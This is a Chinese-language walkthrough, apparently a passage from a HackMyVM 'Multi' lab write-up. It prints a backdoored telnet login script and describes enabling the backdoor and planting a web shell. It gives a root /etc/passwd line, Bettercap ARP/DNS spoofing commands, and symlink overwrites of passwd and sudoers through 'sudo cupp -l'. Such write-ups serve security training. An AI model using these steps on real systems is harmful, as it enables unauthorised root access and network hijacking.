<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">postgres@Multi:/var/lib/postgresql$ cat /usr/local/bin/custom_login        </span><br><span class="line">cat /usr/local/bin/custom_login</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">printf &quot;Username: \r\n&quot;</span><br><span class="line">read -r username</span><br><span class="line">username=$(echo &quot;$username&quot; | tr -d &#x27;\r\n&#x27; | tr -s &#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">if [[ -z &quot;$username&quot; ]]; then</span><br><span class="line">    printf &quot;invalid username\r\n&quot;</span><br><span class="line">    sleep 1</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">printf &quot;Password: \r\n&quot;</span><br><span class="line">read -s -r password</span><br><span class="line">password=$(echo &quot;$password&quot; | tr -d &#x27;\r\n&#x27;)</span><br><span class="line"></span><br><span class="line">if [[ &quot;$username&quot; == &quot;xiao&quot; ]] &amp;&amp; [[ -z &quot;$password&quot; ]]; then</span><br><span class="line">    if grep -q &quot;ENABLE_BACKDOOR&quot; /etc/default/telnet 2&gt;/dev/null; then</span><br><span class="line">        printf &quot;login successful\r\n&quot;</span><br><span class="line">        exec /bin/login -f xiao</span><br><span class="line">        exit 0</span><br><span class="line">    else</span><br><span class="line">        printf &quot;backdoor disabled\r\n&quot;</span><br><span class="line">        sleep 1</span><br><span class="line">        exit 1</span><br><span class="line">    fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [[ &quot;$username&quot; == &quot;xiao&quot; ]] &amp;&amp; [[ -n &quot;$password&quot; ]]; then</span><br><span class="line">    printf &quot;invalid password\r\n&quot;</span><br><span class="line">    sleep 1</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">printf &quot;login failed\r\n&quot;</span><br><span class="line">sleep 1</span><br><span class="line">exit 1</span><br><span class="line">postgres@Multi:/var/lib/postgresql$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>整体分析就是Telnet xiao登录无需密码登陆进去就直接给一个shell</p>
<p>登录失败</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251210185320017.png" alt="image-20251210185320017"></p>
<p>后门没有激活也就是历史命令中的</p>
<p>echo ‘ENABLE_BACKDOOR’ &gt; &#x2F;etc&#x2F;default&#x2F;telnet</p>
<p>ENABLE_BACKDOOR并没有被文件保存我们需要自己再执行一次这个命令</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251210185724646.png" alt="image-20251210185724646"></p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251210190250168.png" alt="image-20251210190250168"></p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251210190344288.png" alt="image-20251210190344288"></p>
<p>在扫到的pub目录发现一个密码文件但是无权访问要成为www-data<br>在web目录写一个shell即可</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251210191154398.png" alt="image-20251210191154398"></p>
<p>得到一个密码</p>
<p>是todd的密码</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251210192742068.png" alt="image-20251210192742068"></p>
<p>看一下</p>
<p>cupp一个字典生成器</p>
<p>逻辑漏洞 + 环境配置缺陷 + 中间人攻击 </p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251210200252666.png" alt="image-20251210200252666"></p>
<p>可以看到执行 sudo &#x2F;usr&#x2F;bin&#x2F;cupp -l 后，脚本会从一个固定的 URL (<a target="_blank" rel="noopener" href="http://ftp.funet.fi/">http://ftp.funet.fi/</a>…) 下载文件。下载的文件会保存在当前工作目录下，并创建一个 <code>dictionaries/</code> 子目录结构</p>
<p>选择 1 Moby，它会尝试创建并写入文件到 <code>./dictionaries/Moby/mhyph.tar.gz</code></p>
<p>但是没有对路径做任何检查我们可以将目标路径设为一个符号链接,这样即可想覆盖什么就覆盖什么</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251210202338178.png" alt="image-20251210202338178"></p>
<p>设置链接</p>
<p>我们可以在&#x2F;etc&#x2F;pass里面加上一个特权用户</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251210201658538.png" alt="image-20251210201658538"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dgh:$1$hacked$mHLOr0u7iVhNIsYN5tMM.0:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/image-20251210202227287.png" alt="image-20251210202227287"></p>
<p>接下来就是使用Bettercap欺骗靶机，让它以为 ftp.funet.fi就是我的 Kali 机器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. 开启网络发现 (激活数据流)</span><br><span class="line">net.probe on</span><br><span class="line"></span><br><span class="line"># 2. 设置 ARP 欺骗 (截获流量)</span><br><span class="line">set arp.spoof.targets 192.168.56.111</span><br><span class="line">arp.spoof on</span><br><span class="line"></span><br><span class="line"># 3. 设置 DNS 欺骗 (核心劫持)</span><br><span class="line"># 注意：这里是用 set dns.spoof.domains，千万别输成 hosts</span><br><span class="line">set dns.spoof.domains ftp.funet.fi</span><br><span class="line">set dns.spoof.address 192.168.56.112</span><br><span class="line">dns.spoof on</span><br></pre></td></tr></table></figure>

<p>再次在靶机上运行sudo &#x2F;usr&#x2F;bin&#x2F;cupp -l</p>
<p>选这1即可使特权用户添加进去</p>
<p>还有一种方法就是</p>
<p>在kali上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;todd ALL=(ALL) NOPASSWD: ALL&quot; &gt; pub/unix/security/passwd/crack/dictionaries/dictionaries/mhyph.tar.gz</span><br></pre></td></tr></table></figure>

<p>链接改为覆盖&#x2F;etc&#x2F;sudoers.d&#x2F;todd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -sf /etc/sudoers.d/todd dictionaries/dictionaries/mhyph.tar.gz</span><br></pre></td></tr></table></figure>

<p>这样todd就获得了对任何命令使用sudo的权利</p>
<p>但是我劫持失败了是因为下面的原因:</p>
<p>VMware 和 VirtualBox 之间存在严重的“生殖隔离”（Layer 2 隔离）</p>
<p>虽然你在两边都配置了 <code>192.168.56.x</code> 的 IP，让它们在网络层 (Layer 3)也许能 Ping 通（通过宿主机的软路由），但在链路层 (Layer 2)，Bettercap 根本发不出 ARP 包给靶机，因为它们在两个完全不同的虚拟交换机上<br>可以将你的kali和靶机迁移都到VirtualBox<br>也可以全部改为桥连模式<br><img src="/../imgs/$%7Bfiilename%7D/image-20251210210903307.png" alt="image-20251210210903307"></p>
<p>并且开启混杂</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">dgh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/12/10/hackmyvm-multi/">http://example.com/2025/12/10/hackmyvm-multi/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">myift</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/png.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/28/hackmyvm-zero/" title="hackmyvm-zero"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">hackmyvm-zero</div></div><div class="info-2"><div class="info-item-1"> ┌──(root㉿kali)-[~]└─# arp-scan -I eth1 192.168.56.0/24WARNING: Could not obtain IP address for interface eth1. Using 0.0.0.0 forthe source address, which may not be what you want.Either configure eth1 with an IP address, or manually specify the addresswith the --arpspa option.Interface: eth1, type: EN10MB, MAC: 00:0c:29:96:80:36, IPv4: (none)Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally...</div></div></div></a><a class="pagination-related" href="/2025/12/10/2025%E9%99%87%E5%89%91%E6%9D%AFFinal-wp/" title="2025陇剑杯Final-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">2025陇剑杯Final-wp</div></div><div class="info-2"><div class="info-item-1">wp: https://mp.weixin.qq.com/s/j2AxmU-2yhRDLnVnxD0xnQ </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">dgh</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E5%AE%9A%E4%BD%8D%E9%9D%B6%E6%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">先定位靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B%E4%B8%80%E4%B8%8B%E5%85%B7%E4%BD%93%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.</span> <span class="toc-text">看一下具体服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ftp%E7%9A%84%E7%89%88%E6%9C%AC%E6%8C%BA%E9%AB%98%E7%9A%84%E7%9C%8B%E4%B8%80%E4%B8%8B%E5%8C%BF%E5%90%8D%E7%99%BB%E9%99%86%E5%B0%B1%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text">ftp的版本挺高的看一下匿名登陆就行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#80web%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.2.</span> <span class="toc-text">80web端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3-445-SMB"><span class="toc-number">2.3.</span> <span class="toc-text">端口 445 (SMB)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nfs"><span class="toc-number">2.4.</span> <span class="toc-text">nfs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3-28080-Python-Werkzeug-Web-%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.5.</span> <span class="toc-text">端口 28080 (Python&#x2F;Werkzeug Web 服务)</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/26/hkcertctf-wp/" title="hkcertctf-wp">hkcertctf-wp</a><time datetime="2025-12-26T14:25:30.000Z" title="发表于 2025-12-26 22:25:30">2025-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/10/2025%E9%99%87%E5%89%91%E6%9D%AFFinal-wp/" title="2025陇剑杯Final-wp">2025陇剑杯Final-wp</a><time datetime="2025-12-10T13:40:03.000Z" title="发表于 2025-12-10 21:40:03">2025-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/10/hackmyvm-multi/" title="hackmyvm_multi">hackmyvm_multi</a><time datetime="2025-12-10T13:39:00.000Z" title="发表于 2025-12-10 21:39:00">2025-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/28/hackmyvm-zero/" title="hackmyvm-zero">hackmyvm-zero</a><time datetime="2025-07-28T09:07:40.000Z" title="发表于 2025-07-28 17:07:40">2025-07-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/28/htb-season8-2-fluffy/" title="htb-season8.2-fluffy">htb-season8.2-fluffy</a><time datetime="2025-07-28T08:32:46.000Z" title="发表于 2025-07-28 16:32:46">2025-07-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By dgh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>